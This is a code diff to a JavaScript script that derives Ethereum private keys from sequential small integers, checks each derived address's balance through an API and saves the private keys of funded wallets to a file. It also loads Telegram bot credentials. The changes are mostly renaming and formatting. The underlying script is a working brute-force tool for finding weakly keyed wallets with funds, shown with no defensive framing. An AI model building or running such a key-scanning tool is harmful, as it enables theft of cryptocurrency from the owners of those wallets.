@@ -3,6 +3,11 @@ const axios = require("axios");
 const fs = require("fs");
 const { apiKey, tgKey, tgChatId } = require("./config.js");
 
+let fileSuffix = "numbers";
+let yesFilename = `yes-${fileSuffix}.txt`;
+let noFilename = `no-${fileSuffix}.txt`;
+let errFilename = `err-${fileSuffix}.txt`;
+
 function getAddress(privateKey) {
   let wallet = new ethers.Wallet(privateKey);
   return [privateKey, wallet.address];
@@ -19,14 +24,14 @@ function getBalanceMultiAddr(priKey, address) {
           let account = data["account"];
           let balance = data["balance"];
           if (balance == "0") {
-            writeFile(priKey[i], account, balance, "no-numbers.txt");
+            writeFile(priKey[i], account, balance, noFilename);
           } else {
-            writeFile(priKey[i], account, balance, "yes-numbers.txt");
+            writeFile(priKey[i], account, balance, yesFilename);
           }
         }
       }
       if (res.data.status == "0") {
-        writeFile(priKey, address, res.data.result, "err-numbers.txt");
+        writeFile(priKey, address, res.data.result, errFilename);
       }
     })
     .catch((err) => console.log(err));
@@ -65,10 +70,10 @@ function getAddrs(priKeys) {
 }
 
 async function sleep(millis) {
-  return new Promise(resolve => setTimeout(resolve, millis));
+  return new Promise((resolve) => setTimeout(resolve, millis));
 }
 
-async function rule2() {
+async function numbers() {
   for (let i = 1; i < 2000000; i += 20) {
     let arr = [];
     for (let j = i; j < i + 20; j++) {
@@ -83,7 +88,7 @@ async function rule2() {
     }
     // console.log(arr)
     getAddrs(arr);
-    await sleep(1000)
+    await sleep(1000);
   }
 }
-rule2();
+numbers();
